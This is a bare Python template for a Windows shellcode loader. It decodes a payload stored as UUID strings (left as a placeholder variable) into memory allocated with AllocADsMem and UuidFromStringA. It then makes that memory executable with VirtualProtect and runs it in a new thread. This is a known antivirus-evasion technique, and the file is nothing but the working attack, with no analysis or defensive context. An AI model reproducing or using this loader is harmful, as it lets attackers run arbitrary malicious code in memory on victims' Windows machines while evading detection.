import ctypes
from ctypes import *
from ctypes.wintypes import *

list = ${sh3llc0de_m}
PDWORD = POINTER(DWORD)
rwxpage = ctypes.windll.Activeds.AllocADsMem(len(list) * 16)
rwxpage1 = rwxpage
for i in list:
    ctypes.windll.Rpcrt4.UuidFromStringA(i,rwxpage1)
    rwxpage1+=16
ctypes.windll.kernel32.VirtualProtect(rwxpage, len(list) * 16, 0x40, PDWORD(c_int(1)))
hanndle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(hanndle, -1)
